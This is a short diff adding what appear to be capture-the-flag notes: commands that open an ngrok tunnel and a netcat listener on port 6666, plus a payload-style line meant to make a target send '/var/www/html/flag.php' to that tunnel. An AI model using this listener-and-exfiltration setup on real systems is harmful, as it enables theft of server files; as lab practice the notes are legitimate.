@@ -1,0 +1,6 @@
+ngrok http 6666
+
+
+nc -nvlp 6666
+
+{ngrok-url}-post-file '/var/www/html/flag.php'
